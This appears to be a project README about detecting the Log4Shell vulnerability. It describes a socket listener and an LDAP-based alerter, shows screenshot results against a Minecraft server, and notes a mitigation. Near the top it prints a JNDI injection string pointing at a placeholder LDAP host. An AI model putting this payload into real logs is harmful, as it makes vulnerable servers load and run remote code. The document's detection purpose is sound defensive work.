# Log4Shell Zero-Day Exploit

if attacker manage to log this string `${jndi:ldap://someaddresshere/param1=value1}`
to log4j it somehow loads the class/java bytecode sent by Attacker Controlled LDAP Server. The bytecode could be used to
execute any malicious code or do some little trolling.

## Detection

### Patched

- Mitigated by deleting `org.apache.logging.log4j.core.lookup.JndiLookup` somehow didn't crash
  ![](https://cdn.discordapp.com/attachments/840041811384860707/919169712435388466/unknown.png)

### Unpatched

- Note: 1.16.5 Minecraft Server
  ![](https://cdn.discordapp.com/attachments/840041811384860707/919170755843989534/unknown.png)
  ![](https://cdn.discordapp.com/attachments/840041811384860707/919172251771895878/unknown.png)

### [MainDetector.java](standalone-detector/src/main/java/itzbenz/MainDetector.java)

Use simple socket to listen on port 1389 then close the socket once its connected no external dependency

- Vulnerable:\
  ![](https://cdn.discordapp.com/attachments/840041811384860707/919166884425900082/unknown.png)

- Console:\
  ![](https://cdn.discordapp.com/attachments/840041811384860707/919166938654072852/unknown.png)

going to throw error if its is vulnerable

### [MainAlerter.java](standalone-detector/src/main/java/itzbenz/MainAlerter.java)

Use `com.unboundid:unboundid-ldapsdk` library to host LDAP server

- Vulnerable:
  ![](https://cdn.discordapp.com/attachments/840041811384860707/919168285709312000/unknown.png)
- LADP Server:
  ![](https://cdn.discordapp.com/attachments/840041811384860707/919171844836311050/unknown.png)

# DNS Log

Both sender and receiver are logged which mean they are vulnerable

- Vulnerable:
  ![](https://cdn.discordapp.com/attachments/840041811384860707/919174049861619752/unknown.png)
